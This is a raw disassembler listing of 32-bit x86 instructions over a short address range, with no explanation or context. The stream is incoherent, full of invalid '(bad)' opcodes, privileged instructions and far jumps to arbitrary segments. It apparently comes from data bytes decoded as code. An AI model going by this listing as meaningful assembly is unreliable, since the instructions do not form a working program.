  40bb2b:	cmp    BYTE PTR [eax],dl
  40bb2d:	inc    ebp
  40bb2e:	int    0x96
  40bb30:	xchg   edi,eax
  40bb31:	mov    bh,0x36
  40bb33:	xor    al,0xba
  40bb35:	adc    DWORD PTR [edi],edi
  40bb37:	jg     0x40bb3e
  40bb39:	stos   BYTE PTR es:[edi],al
  40bb3a:	mov    al,0x1c
  40bb3c:	idiv   BYTE PTR [edi]
  40bb3e:	shl    BYTE PTR [eax],1
  40bb40:	inc    ebp
  40bb41:	fs push ecx
  40bb43:	outs   dx,DWORD PTR ds:[esi]
  40bb44:	dec    ecx
  40bb45:	call   0x39fe:0x33b4d7a9
  40bb4c:	mov    bl,0xd8
  40bb4e:	pop    ebp
  40bb4f:	xchg   esp,eax
  40bb50:	push   es
  40bb51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb52:	sahf   
  40bb53:	sbb    BYTE PTR [eax],ah
  40bb55:	(bad)  
  40bb56:	out    0x8d,al
  40bb58:	(bad)  
  40bb59:	sbb    DWORD PTR [edi+ebp*1+0x7fda912f],ebp
  40bb60:	push   esp
  40bb61:	adc    eax,0xe75f8152
  40bb66:	lods   eax,DWORD PTR ds:[esi]
  40bb67:	mov    BYTE PTR [ebx+0x7],ah
  40bb6a:	adc    eax,0x401a296e
  40bb6f:	retf   0x6a7d
  40bb72:	daa    
  40bb73:	sbb    edi,DWORD PTR [eax+ecx*8+0x5aa10b21]
  40bb7a:	inc    ecx
  40bb7b:	or     al,0x81
  40bb7d:	daa    
  40bb7e:	fwait
  40bb7f:	sbb    esp,DWORD PTR [edx+0x30]
  40bb82:	aam    0x6c
  40bb84:	xchg   esp,eax
  40bb85:	and    DWORD PTR [edx+0x3850c416],esi
  40bb8b:	cmp    DWORD PTR [edx-0x7bbee314],eax
  40bb91:	jnp    0x40bb30
  40bb93:	int3   
  40bb94:	fist   DWORD PTR [edi+ecx*2-0x17]
  40bb98:	xchg   edx,eax
  40bb99:	dec    edx
  40bb9a:	test   al,0xaa
  40bb9c:	lods   al,BYTE PTR ds:[esi]
  40bb9d:	mov    cl,BYTE PTR [ebx+0x1549e222]
  40bba3:	and    eax,0xe1efd41
  40bba8:	xchg   esp,eax
  40bba9:	stos   BYTE PTR es:[edi],al
  40bbaa:	(bad)  
  40bbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbac:	jecxz  0x40bc1d
  40bbae:	sub    edx,DWORD PTR [esi]
  40bbb0:	mov    eax,ds:0x950ed2bc
  40bbb5:	ss aaa 
  40bbb7:	cmp    al,0x2c
  40bbb9:	xchg   esi,eax
  40bbba:	mov    cl,0x12
  40bbbc:	popf   
  40bbbd:	adc    DWORD PTR [ebp-0x396daca2],0xffffff9c
  40bbc4:	aam    0x1c
  40bbc6:	or     cl,BYTE PTR ds:[ecx]
  40bbc9:	ret    
  40bbca:	retf   
  40bbcb:	cmc    
  40bbcc:	retf   0x2c7e
  40bbcf:	sbb    eax,0x4324656e
  40bbd4:	loopne 0x40bb8e
  40bbd6:	adc    eax,0x83892d8
  40bbdb:	std    
  40bbdc:	mov    ds:0xb48c8df2,eax
  40bbe1:	push   0xffffff9b
  40bbe3:	(bad)  
  40bbe4:	fld    TBYTE PTR [ebp-0x56b2cee8]
  40bbea:	sub    BYTE PTR [ebx-0x62c4a5c0],0x5d
  40bbf1:	or     BYTE PTR [edi],al
  40bbf3:	add    al,0x40
  40bbf5:	mov    esp,0x3414aeee
  40bbfa:	pushf  
  40bbfb:	sub    dh,BYTE PTR [ebx+0x6e]
  40bbfe:	test   BYTE PTR [esi+eiz*1+0x41ab3ea5],dl
  40bc05:	out    dx,eax
  40bc06:	mov    eax,ds:0x4372050a
  40bc0b:	repz js 0x40bc3c
  40bc0e:	in     al,0xa1
  40bc10:	jne    0x40bbea
  40bc12:	sub    edx,DWORD PTR [eax]
  40bc14:	(bad)  
  40bc15:	in     al,dx
  40bc16:	mov    WORD PTR [ebx+0x53b7f978],fs
  40bc1c:	mov    eax,ds:0x9bae7323
  40bc21:	add    al,BYTE PTR [edx]
  40bc23:	cmp    ecx,DWORD PTR [ecx]
  40bc25:	mov    cl,0x79
  40bc27:	(bad)  
  40bc28:	shl    BYTE PTR [ecx+0x73],cl
  40bc2b:	pop    eax
  40bc2c:	adc    ecx,DWORD PTR [ebp+edx*2+0x62]
  40bc30:	xchg   esp,eax
  40bc31:	sub    al,0xcc
  40bc33:	jno    0x40bbfa
  40bc35:	dec    esi
  40bc36:	leave  
  40bc37:	sub    al,0x6
  40bc39:	scas   al,BYTE PTR es:[edi]
  40bc3a:	inc    edx
  40bc3b:	fimul  DWORD PTR [ecx]
  40bc3d:	mov    edx,0x579917e5
  40bc42:	xchg   BYTE PTR [edx-0x73],cl
  40bc45:	cmp    eax,0x6370eeb8
  40bc4a:	or     ebx,DWORD PTR [ecx-0x52]
  40bc4d:	pop    ecx
  40bc4e:	sub    al,BYTE PTR [edi]
  40bc50:	outs   dx,DWORD PTR ds:[esi]
  40bc51:	push   esi
  40bc52:	sbb    eax,0x8c5ea994
  40bc57:	int    0xe9
  40bc59:	adc    DWORD PTR [esp+ecx*8+0x39],edx
  40bc5d:	nop
  40bc5e:	push   esi
  40bc5f:	iret   
  40bc60:	cld    
  40bc61:	sahf   
  40bc62:	adc    ch,al
  40bc64:	pusha  
  40bc65:	lea    eax,[esi]
  40bc67:	test   DWORD PTR [esi+0x6991e766],eax
  40bc6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc6e:	pop    esp
  40bc6f:	mov    eax,0x44835f0e
  40bc74:	cmp    bh,BYTE PTR [ebp-0x66]
  40bc77:	xor    dl,BYTE PTR [ecx]
  40bc79:	and    BYTE PTR [ebp-0x28],ch
  40bc7c:	icebp  
  40bc7d:	stos   BYTE PTR es:[edi],al
  40bc7e:	sti    
  40bc7f:	pop    ebp
  40bc80:	adc    eax,0xf88893a9
  40bc85:	imul   edx,DWORD PTR [ebx],0xffffff8d
  40bc88:	seta   BYTE PTR [ecx+0x1]
  40bc8c:	pop    eax
  40bc8d:	sub    DWORD PTR [ebx+0x7c66bbe5],edi
  40bc93:	jmp    0xb59c:0x54f88678
  40bc9a:	leave  
  40bc9b:	inc    ecx
  40bc9c:	rcr    DWORD PTR [ebx+0x1b3ad8a4],0xdb
  40bca3:	add    ch,BYTE PTR [edx-0x19bd2534]
  40bca9:	add    edi,DWORD PTR [ebx-0x10279a25]
  40bcaf:	stc    
  40bcb0:	mov    bl,0xcd
  40bcb2:	pop    ss
  40bcb3:	and    ah,BYTE PTR [ecx+0x3e]
  40bcb6:	xchg   ebx,eax
  40bcb7:	xchg   esi,eax
  40bcb8:	and    BYTE PTR [edx-0x2],0x42
  40bcbc:	mov    ebx,esi
  40bcbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcbf:	mov    eax,ds
  40bcc1:	fs xor eax,0x9548b6c4
  40bcc7:	push   cs
  40bcc8:	in     eax,0xd1
  40bcca:	mov    edi,0x6f0211e6
  40bccf:	xchg   esi,eax
  40bcd0:	cmp    edi,DWORD PTR [eax-0x62c6afb2]
  40bcd6:	jo     0x40bc6e
  40bcd8:	pushf  
  40bcd9:	out    0xf0,eax
  40bcdb:	fst    DWORD PTR [ebp+0x41]
  40bcde:	mov    ds:0x7f188784,eax
  40bce3:	repnz mov edx,0x80ed4a0d
  40bce9:	sbb    BYTE PTR [esi+0x73343f18],bh
  40bcef:	aas    
  40bcf0:	nop
  40bcf1:	sti    
  40bcf2:	mov    bl,0x13
  40bcf4:	popf   
  40bcf5:	(bad)  
  40bcf6:	mov    edi,0xccce03f9
  40bcfb:	sar    DWORD PTR [ebp+0x41bd82b7],0x15
  40bd02:	mov    ebp,0xfb973b7d
  40bd07:	retf   
  40bd08:	mov    ds:0xdc2bbf6e,al
  40bd0d:	or     ebp,DWORD PTR [edx-0x7c]
  40bd10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd11:	pop    ss
  40bd12:	cmp    al,0x52
  40bd14:	push   esi
  40bd15:	inc    esp
  40bd16:	mov    ecx,0xcdf486f9
  40bd1b:	and    esp,esp
  40bd1d:	mov    al,0xc9
  40bd1f:	jg     0x40bcbf
  40bd21:	sbb    DWORD PTR [edi+0x75022ba8],edx
  40bd27:	mov    dl,0x5f
  40bd29:	lea    edx,[eax+0x2d]
  40bd2c:	xor    al,bl
  40bd2e:	frstor [edx]
  40bd30:	gs adc eax,0x2f0f1925
  40bd36:	pusha  
  40bd37:	fadd   DWORD PTR [ebx+0x49897a84]
  40bd3d:	mov    bh,0x16
  40bd3f:	fs in  al,dx
  40bd41:	leave  
  40bd42:	mov    ecx,0x2067852e
  40bd47:	(bad)  
  40bd48:	xor    eax,0x780c5ab
  40bd4d:	jp     0x40bcdf
  40bd4f:	or     edi,esp
  40bd51:	cmp    al,0xf7
  40bd53:	test   eax,0xfdf71a20
  40bd58:	xchg   esi,eax
  40bd59:	lock arpl cx,si
  40bd5c:	mov    cl,0x73
  40bd5e:	adc    edx,esi
  40bd60:	push   ds
  40bd61:	cmc    
  40bd62:	sub    DWORD PTR [ebx],edx
  40bd64:	cs pop eax
  40bd66:	xchg   ebx,eax
  40bd67:	adc    al,0xa2
  40bd69:	imul   esp,DWORD PTR [ecx+0x11f9fac2],0xffffffff
  40bd70:	repnz cmc 
  40bd72:	dec    ebx
  40bd73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd74:	push   0xde02d3b
  40bd79:	dec    esi
  40bd7a:	(bad)  
  40bd7b:	das    
  40bd7c:	ret    
  40bd7d:	ret    
  40bd7e:	jp     0x40bdb5
  40bd80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd81:	inc    eax
  40bd82:	and    esi,ebp
  40bd84:	sub    esi,DWORD PTR [esi+0x79]
  40bd87:	out    dx,al
  40bd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd89:	sbb    esi,DWORD PTR [edi+0x64880bfe]
  40bd8f:	js     0x40bd5a
  40bd91:	mov    ch,0x5e
  40bd93:	add    BYTE PTR [edi+0x1],0x9b
  40bd97:	mov    al,ds:0x64a5e771
  40bd9c:	pop    esp
  40bd9d:	sbb    al,0x7c
  40bd9f:	adc    dl,BYTE PTR [edx+0x111ee5e4]
  40bda5:	and    eax,0x2f9fe20a
  40bdaa:	arpl   WORD PTR [edi],sp
  40bdac:	es pop ecx
  40bdae:	iret   
  40bdaf:	stc    
  40bdb0:	call   0xd177:0xc84301c0
  40bdb7:	repz sbb ch,BYTE PTR [ebx+0x6]
  40bdbb:	(bad)  [ebp-0x71967c3b]
  40bdc1:	dec    esi
  40bdc2:	fdivrp st(5),st
  40bdc4:	pushf  
  40bdc5:	mov    es,WORD PTR [ebx]
  40bdc7:	adc    dh,BYTE PTR [edi+eiz*4-0x34d4c0ab]
  40bdce:	cmp    eax,0xf8e4e14b
  40bdd3:	xor    al,0xd1
  40bdd5:	mov    bl,0xb6
  40bdd7:	cld    
  40bdd8:	and    ah,cl
  40bdda:	pop    ebp
  40bddb:	fs enter 0x533d,0x7d
  40bde0:	popf   
  40bde1:	mov    eax,0xec69e85f
  40bde6:	dec    ecx
  40bde7:	fdivr  st(5),st
  40bde9:	shl    cl,cl
  40bdeb:	addr16 out dx,eax
  40bded:	inc    ebp
  40bdee:	jo     0x40be5b
  40bdf0:	cmp    ebx,edi
  40bdf2:	push   ebp
  40bdf3:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40bdf5:	adc    eax,0x160df166
  40bdfa:	bound  ebx,QWORD PTR [edx+0x10]
  40bdfd:	adc    BYTE PTR [ebp+0x22],bh
  40be00:	dec    edx
  40be01:	cli    
  40be02:	ss ss retf 
  40be05:	dec    eax
  40be06:	add    dh,BYTE PTR [esi+edx*2+0x5c6698ff]
  40be0d:	sub    esi,esp
  40be0f:	cdq    
  40be10:	lea    ebp,[eax-0x27]
  40be13:	retf   0x9530
  40be16:	add    eax,0xacdc7663
  40be1b:	dec    eax
  40be1c:	push   ds
  40be1d:	push   ds
  40be1e:	cdq    
  40be1f:	push   eax
  40be20:	fabs   
  40be22:	jnp    0x40bea3
  40be24:	lods   eax,DWORD PTR ds:[esi]
  40be25:	mov    ds:0xc4ebad73,eax
  40be2a:	cmp    ebp,DWORD PTR [esi]
  40be2c:	pop    esi
  40be2d:	xchg   edi,eax
  40be2e:	jl     0x40bddf
  40be30:	stos   BYTE PTR es:[edi],al
  40be31:	sar    BYTE PTR [eax],cl
  40be33:	mov    ecx,0x3dee071f
  40be38:	sub    DWORD PTR [edi],esp
  40be3a:	test   al,0x1e
  40be3c:	mov    ecx,0x8f202aae
  40be41:	sbb    BYTE PTR [edx+0x7336339],0x7
  40be48:	push   ecx
  40be49:	pop    edi
  40be4a:	or     al,0xf8
  40be4c:	or     DWORD PTR [esi],esi
  40be4e:	push   0xb1ed52
  40be53:	pop    esp
  40be54:	pop    es
  40be55:	nop
  40be56:	cdq    
  40be57:	shr    BYTE PTR [edx+0xfa6e710],0x4e
  40be5e:	(bad)  
  40be5f:	fmul   DWORD PTR [ebp+0x2d]
  40be62:	fisttp QWORD PTR [edi+0x30b277c8]
  40be68:	and    edx,DWORD PTR [esi]
  40be6a:	cdq    
  40be6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be6c:	adc    eax,DWORD PTR [ecx+ebp*2+0x1a]
  40be70:	or     eax,DWORD PTR [edx-0x23]
  40be73:	dec    esp
  40be74:	sub    al,0x35
  40be76:	test   al,0xbc
  40be78:	test   ah,dl
  40be7a:	data16 mov bh,BYTE PTR [edx]
  40be7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be7e:	jo     0x40be4e
  40be80:	inc    ebx
  40be81:	test   al,0x63
  40be83:	or     ecx,edx
  40be85:	adc    bh,BYTE PTR [esi+0x12]
  40be88:	adc    BYTE PTR [ecx-0x75072115],ah
  40be8e:	test   ebp,0x94dc5646
  40be94:	jecxz  0x40be55
  40be96:	push   0xffffffcd
  40be98:	ror    dl,0xd9
  40be9b:	jnp    0x40be56
  40be9d:	adc    eax,0x5a0f6f4b
  40bea2:	out    dx,al
  40bea3:	push   0xffffffc4
  40bea5:	je     0x40bed9
  40bea7:	mov    ebp,DWORD PTR [edi+0x41ea4c74]
  40bead:	cmovns esp,DWORD PTR [ebx-0x56a3e8a3]
  40beb4:	mov    dl,0x2
  40beb6:	adc    eax,0x6415c67a
  40bebb:	inc    edx
  40bebc:	mov    eax,ds:0xe60634fc
  40bec1:	pop    esi
  40bec2:	xor    al,0x84
  40bec4:	(bad)  
  40bec6:	icebp  
  40bec7:	push   0xd730d760
  40becc:	imul   DWORD PTR [edx+edx*2]
  40becf:	push   cs
  40bed0:	add    BYTE PTR [ecx],cl
  40bed2:	test   eax,0xcbf0cc2c
  40bed7:	idiv   BYTE PTR [ebp+0x2f3a0da6]
  40bedd:	icebp  
  40bede:	jne    0x40bf19
  40bee0:	leave  
  40bee1:	rcl    BYTE PTR [edx],0x66
  40bee4:	sub    eax,0x9df3df60
  40bee9:	je     0x40bf47
  40beeb:	popf   
  40beec:	xor    al,0x5a
  40beee:	fbstp  TBYTE PTR [ebx+esi*4+0x70046132]
  40bef5:	dec    ebp
  40bef6:	inc    esp
  40bef7:	ret    0xefa2
  40befa:	sti    
  40befb:	bound  ebx,QWORD PTR [ecx]
  40befd:	loop   0x40be84
  40beff:	test   DWORD PTR [edx+0x770aae2b],edx
  40bf05:	stos   BYTE PTR es:[edi],al
  40bf06:	adc    DWORD PTR ds:0x8807620b,edx
  40bf0c:	adc    ch,BYTE PTR [edx+0x5f]
  40bf0f:	loop   0x40beb0
  40bf11:	fs fucomp st(2)
  40bf14:	test   eax,0xd44f0579
  40bf19:	in     al,dx
  40bf1a:	cmp    al,0x50
  40bf1c:	mov    bl,0x6d
  40bf1e:	xor    al,0x35
  40bf20:	xchg   ebp,eax
  40bf21:	mov    ?,WORD PTR [eax+0x6efde4a9]
  40bf27:	call   0x505f:0x2ed2b4a
  40bf2e:	mov    edx,0xb1654d2c
  40bf33:	mov    ah,BYTE PTR [eax]
  40bf35:	adc    ebp,DWORD PTR [edi-0x3]
  40bf38:	push   cs
  40bf39:	mov    ecx,0x1698d028
  40bf3e:	leave  
  40bf3f:	sbb    eax,0x53c2c0d
  40bf44:	loopne 0x40bf1d
  40bf46:	das    
  40bf47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf48:	push   ecx
  40bf49:	stos   DWORD PTR es:[edi],eax
  40bf4a:	sub    ah,BYTE PTR [ebx+ecx*1+0x1c5765fd]
  40bf51:	jmp    0x40bfa2
  40bf53:	mov    al,0x6d
  40bf55:	test   al,0x81
  40bf57:	push   edi
  40bf58:	push   ss
  40bf59:	jb     0x40beed
  40bf5b:	rol    ah,cl
  40bf5d:	push   edi
  40bf5e:	mov    edx,0x9cb62ffb
  40bf63:	jo     0x40bfa1
  40bf65:	pop    DWORD PTR [esi]
  40bf67:	aam    0xef
  40bf69:	fs and al,0x66
  40bf6c:	mov    dh,cl
  40bf6e:	shl    DWORD PTR ds:0x66de5e66,0x3e
  40bf75:	xchg   ecx,eax
  40bf76:	cmc    
  40bf77:	pshufw mm3,QWORD PTR [edx-0x3a],0x30
  40bf7c:	loop   0x40bf25
  40bf7e:	retf   
  40bf7f:	dec    edx
  40bf80:	mov    bl,0x79
  40bf82:	(bad)  
  40bf83:	jp     0x40c003
  40bf85:	ror    bh,cl
  40bf87:	ja     0x40bfa5
  40bf89:	test   DWORD PTR [ecx-0x4d56c47],ebx
  40bf8f:	rcr    DWORD PTR [eax-0xd],0x69
  40bf93:	sub    eax,0x2f1ebe85
  40bf98:	or     BYTE PTR [edx-0x74870667],bh
  40bf9e:	lods   al,BYTE PTR ds:[esi]
  40bf9f:	fadd   QWORD PTR [edx+ebp*8+0x69a2296a]
  40bfa6:	arpl   WORD PTR [ebp+0x6b],ax
  40bfa9:	cmp    edi,edi
  40bfab:	into   
  40bfac:	xor    esp,DWORD PTR [ebx+0x7]
  40bfaf:	ja     0x40bf3c
  40bfb1:	pop    esi
  40bfb2:	jle    0x40bf9f
  40bfb4:	mov    bh,0x61
  40bfb6:	in     al,dx
  40bfb7:	and    DWORD PTR [esi+0x36],esp
  40bfba:	add    al,0xb
  40bfbc:	pop    ss
  40bfbd:	push   edx
  40bfbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfbf:	mov    eax,ds:0x1f5ac376
  40bfc4:	sbb    ebp,DWORD PTR [eax+0x65a07586]
  40bfca:	fs push esi
  40bfcc:	adc    eax,eax
  40bfce:	daa    
  40bfcf:	cmp    DWORD PTR [ebp-0x68],esi
  40bfd2:	hlt    
  40bfd3:	xchg   esi,eax
  40bfd4:	js     0x40bf5f
  40bfd6:	es rcl edi,cl
  40bfd9:	cmp    DWORD PTR [ebx+ebp*2+0x1339ebc],esp
  40bfe0:	shr    BYTE PTR [eax+eax*8+0x42],0x5b
  40bfe5:	mov    ah,0xce
  40bfe7:	mov    eax,0x5ad163f1
  40bfec:	pusha  
  40bfed:	mov    ebp,0xd450daf3
  40bff2:	sbb    BYTE PTR [eax+0x39],cl
  40bff5:	dec    ecx
  40bff6:	pop    ds
  40bff7:	xchg   dl,ah
  40bff9:	rcl    DWORD PTR [ebp+edi*2+0x4c983563],0x3f
  40c001:	mov    BYTE PTR [edx+0x51],bh
  40c004:	icebp  
  40c005:	push   0x1ee9be7b
  40c00a:	or     edx,DWORD PTR [eax]
  40c00c:	stos   DWORD PTR es:[edi],eax
  40c00d:	(bad)  
  40c00e:	fsub   QWORD PTR [eax]
  40c010:	fdivr  QWORD PTR [edi+0x33]
  40c013:	mov    al,ds:0xe501bd2c
  40c018:	adc    BYTE PTR [ebx],bl
  40c01a:	arpl   WORD PTR [ecx],ax
  40c01c:	push   ds
  40c01d:	push   edi
  40c01e:	inc    edx
  40c01f:	test   al,0xcf
  40c021:	xor    al,0x8e
  40c023:	or     DWORD PTR [ebx+0x534998b0],esp
  40c029:	xor    BYTE PTR [ecx+0x41],0x5f
  40c02d:	cmp    eax,esp
  40c02f:	xor    al,0xd
  40c031:	jle    0x40c050
  40c033:	xchg   ecx,eax
  40c034:	lods   eax,DWORD PTR ds:[esi]
  40c035:	shl    DWORD PTR [esi],1
  40c037:	fidivr DWORD PTR [ebp+0x5a]
  40c03a:	call   0x3c9:0xcbaead4f
  40c041:	and    DWORD PTR [ebp-0x6b0c83d3],eax
  40c047:	mov    bh,0x8a
  40c049:	nop
  40c04a:	sbb    al,0x44
  40c04c:	inc    ebx
  40c04d:	mov    DWORD PTR [edi],eax
  40c04f:	dec    edx
  40c050:	inc    ecx
  40c051:	in     al,0x22
  40c053:	loop   0x40c079
  40c055:	sub    al,0xba
  40c057:	enter  0x289c,0x9c
  40c05b:	mov    ds:0x6cb386bb,al
  40c060:	mov    ?,WORD PTR [edi-0x4d1b6645]
  40c066:	shrd   edx,edi,cl
  40c069:	sub    al,0xff
  40c06b:	mov    ecx,ds
  40c06d:	out    dx,eax
  40c06e:	and    DWORD PTR [eax+0x3a],edi
  40c071:	mov    al,0x31
  40c073:	into   
  40c074:	adc    DWORD PTR [eax+0xe],edi
  40c077:	fwait
  40c078:	pushf  
  40c079:	pushf  
  40c07a:	inc    edx
  40c07b:	loopne 0x40c079
  40c07d:	pop    esi
  40c07e:	ror    ebp,cl
  40c080:	xchg   esi,eax
  40c081:	mov    eax,0x2a34a85b
  40c086:	jmp    0x40c08e
  40c088:	daa    
  40c089:	call   0x9970:0x310eb265
  40c090:	mov    ah,0xe
  40c092:	pop    ds
  40c093:	and    cl,BYTE PTR [edx-0x19]
  40c096:	inc    ebx
  40c097:	xchg   esp,eax
  40c098:	xor    eax,0x281156f4
  40c09d:	das    
  40c09e:	rol    BYTE PTR [ecx-0x8d81294],0x5d
  40c0a5:	rcr    BYTE PTR [esp+esi*1+0x60],cl
  40c0a9:	jmp    0x40c059
  40c0ab:	jge    0x40c10f
  40c0ad:	fldenv [ecx-0x35c64716]
  40c0b3:	stos   DWORD PTR es:[edi],eax
  40c0b4:	jle    0x40c099
  40c0b6:	sti    
  40c0b7:	sbb    DWORD PTR [esi],eax
  40c0b9:	mov    edi,0x9679fff0
  40c0be:	jo     0x40c083
  40c0c0:	hlt    
  40c0c1:	loope  0x40c048
  40c0c3:	add    eax,DWORD PTR [ecx]
  40c0c5:	xchg   ebp,eax
  40c0c6:	cld    
  40c0c7:	nop
  40c0c8:	jns    0x40c05c
  40c0ca:	ror    DWORD PTR ds:0xca7e18f5,cl
  40c0d0:	neg    BYTE PTR [ebp+0x2f]
  40c0d3:	sub    bh,BYTE PTR [ebx-0x34]
  40c0d6:	iret   
  40c0d7:	mov    ah,0xfe
  40c0d9:	xchg   esp,eax
  40c0da:	push   cs
  40c0db:	in     eax,dx
  40c0dc:	xor    DWORD PTR [ebp-0x4c8fd08f],ebx
  40c0e2:	or     DWORD PTR [esi+eax*4-0x2b],edx
  40c0e6:	cdq    
  40c0e7:	cmp    eax,0x66725aaa
  40c0ec:	mov    bh,0x39
  40c0ee:	push   es
  40c0ef:	lods   al,BYTE PTR ds:[esi]
  40c0f0:	retf   0xb4f1
  40c0f3:	outs   dx,BYTE PTR ds:[esi]
  40c0f4:	adc    ecx,DWORD PTR [edi+0x47997ba6]
  40c0fa:	ja     0x40c0d8
  40c0fc:	mov    edx,DWORD PTR [edi-0x5ccfcdb]
  40c102:	mov    ebx,0x795da6ab
  40c107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c108:	jp     0x40c187
  40c10a:	xchg   esi,eax
  40c10b:	jb     0x40c17c
  40c10d:	adc    BYTE PTR [esi-0x57e3a6c8],al
  40c113:	push   edi
  40c114:	test   al,0xd0
  40c116:	ret    0x4ffa
  40c119:	and    DWORD PTR [ecx-0x2],esp
  40c11c:	cmp    eax,0x8ed1c6e7
  40c121:	add    bh,bh
  40c123:	push   ebp
  40c124:	xor    esi,DWORD PTR [esi-0x5556514c]
  40c12a:	cmp    DWORD PTR [ebp+0x1d8b3b2],edx
  40c130:	sub    al,0x38
  40c132:	popa   
  40c133:	out    dx,eax
  40c134:	mov    ebx,0x3ecb3f27
  40c139:	inc    eax
  40c13a:	in     al,dx
  40c13b:	push   esp
  40c13c:	(bad)  
  40c13d:	jmp    DWORD PTR [ecx+eiz*2+0x6d05657]
  40c144:	fwait
  40c145:	inc    esp
  40c146:	adc    eax,0x69d8f11
  40c14b:	add    ebp,DWORD PTR [ebp+0xf]
  40c14e:	(bad)  
  40c14f:	fmul   DWORD PTR [esi]
  40c151:	ins    BYTE PTR es:[edi],dx
  40c152:	add    cl,BYTE PTR [edx-0x12]
  40c155:	jns    0x40c1ab
  40c157:	adc    al,0xda
  40c159:	test   eax,0xb7b33afe
  40c15e:	sar    BYTE PTR [ebp+eiz*2+0x6f],0x4f
  40c163:	fild   WORD PTR ds:0xbd731675
  40c169:	mov    edi,0x47b8e4d2
  40c16e:	adc    DWORD PTR [ebx+0x24],ebx
  40c171:	nop
  40c172:	les    esp,FWORD PTR [edx]
  40c174:	repnz push 0xc68f2dcb
  40c17a:	sbb    ch,BYTE PTR [ecx]
  40c17c:	scas   eax,DWORD PTR es:[edi]
  40c17d:	inc    eax
  40c17e:	arpl   WORD PTR [eax-0x69],cx
  40c181:	out    0x81,al
  40c183:	xlat   BYTE PTR ds:[ebx]
  40c184:	sbb    ch,ah
  40c186:	int3   
  40c187:	cmp    eax,0xe62f06d6
  40c18c:	pop    eax
  40c18d:	leave  
  40c18e:	xor    DWORD PTR [eax-0x5c40e190],esp
  40c194:	inc    ebp
  40c195:	jb     0x40c130
  40c197:	rcr    BYTE PTR [ebp-0x65],cl
  40c19a:	pop    edx
  40c19b:	jnp    0x40c173
  40c19d:	cli    
  40c19e:	mov    ss,WORD PTR [ecx+0x55860d0e]
  40c1a4:	xchg   ebx,eax
  40c1a5:	leave  
  40c1a6:	dec    esp
  40c1a7:	cmp    al,0xff
  40c1a9:	cld    
  40c1aa:	adc    eax,0xb73c1cd5
  40c1af:	es mov edi,0xb5882af0
  40c1b5:	stc    
  40c1b6:	xor    DWORD PTR [eax-0x3708693a],edx
  40c1bc:	push   ebp
  40c1bd:	ret    
  40c1be:	jb     0x40c225
  40c1c0:	stos   BYTE PTR es:[edi],al
  40c1c1:	adc    BYTE PTR [edi+0x137780ef],0x23
  40c1c8:	mov    al,ds:0x8677eb36
  40c1cd:	dec    edi
  40c1ce:	or     DWORD PTR [edi+ebp*2],esi
  40c1d1:	push   ecx
  40c1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d3:	enter  0x6687,0xa6
  40c1d7:	les    ecx,FWORD PTR [eax+0x3ea43366]
  40c1dd:	adc    bl,0x91
  40c1e0:	call   0xaf48:0x7008e851
  40c1e7:	icebp  
  40c1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1e9:	daa    
  40c1ea:	cs inc ebp
  40c1ec:	push   0xeeefa794
  40c1f1:	cdq    
  40c1f2:	shl    BYTE PTR [edi+0xd6f48f],0xac
  40c1f9:	ret    
  40c1fa:	add    BYTE PTR [eax-0x3eaa0929],al
  40c200:	or     eax,0xc881f0d4
  40c205:	daa    
  40c206:	hlt    
  40c207:	adc    cl,BYTE PTR gs:[edi+0x1f]
  40c20b:	or     eax,0x2ed44df6
  40c210:	popa   
  40c211:	xor    bh,BYTE PTR ds:0x64ceb6db
  40c217:	push   ecx
  40c218:	or     DWORD PTR [ebx-0x75],ecx
  40c21b:	xlat   BYTE PTR ds:[ebx]
  40c21c:	scas   al,BYTE PTR es:[edi]
  40c21d:	cdq    
  40c21e:	cdq    
  40c21f:	fadd   QWORD PTR [esi]
  40c221:	inc    edx
  40c222:	nop
  40c223:	jecxz  0x40c1f8
  40c225:	fimul  DWORD PTR [ecx]
  40c227:	pop    es
  40c228:	inc    ecx
  40c229:	xor    BYTE PTR [ecx],dl
  40c22b:	mov    eax,0xea4beeee
  40c230:	int    0x90
  40c232:	xor    bl,BYTE PTR [edx]
  40c234:	fadd   QWORD PTR [esi-0x5efe5c35]
  40c23a:	fs fcomi st,st(6)
  40c23d:	mov    ch,0x9b
  40c23f:	dec    esi
  40c240:	xchg   edi,eax
  40c241:	ja     0x40c285
  40c243:	mov    esp,0xb1e1d907
  40c248:	xchg   ebx,eax
  40c249:	mov    dh,0xb5
  40c24b:	push   cs
  40c24c:	mov    ebp,0xef11a60f
  40c251:	mov    cl,0x3b
  40c253:	push   0x21
  40c255:	push   0xffffffd0
  40c257:	das    
  40c258:	mov    dh,ch
  40c25a:	jg     0x40c20e
  40c25c:	xor    ah,ch
  40c25e:	push   edi
  40c25f:	fisttp WORD PTR [edx-0x258e5497]
  40c265:	lahf   
  40c266:	jno    0x40c237
  40c268:	pop    eax
  40c269:	iret   
  40c26a:	pop    ecx
  40c26b:	popf   
  40c26c:	data16 sti 
  40c26e:	ins    BYTE PTR es:[edi],dx
  40c26f:	sub    DWORD PTR [ecx],esi
  40c271:	sub    eax,0x9bc36563
  40c276:	sar    DWORD PTR [ebx+ebp*8],cl
  40c279:	jne    0x40c292
  40c27b:	out    dx,al
  40c27c:	cdq    
  40c27d:	test   al,0x48
  40c27f:	jp     0x40c2e7
  40c281:	loop   0x40c2ec
  40c283:	cld    
  40c284:	cmp    ebp,esi
  40c286:	xor    DWORD PTR [ebp-0xb],esp
  40c289:	iret   
  40c28a:	mov    ah,0x6f
  40c28c:	rol    DWORD PTR [ebx-0x1046d0b3],0xf4
  40c293:	xor    al,BYTE PTR [esi+0x4b]
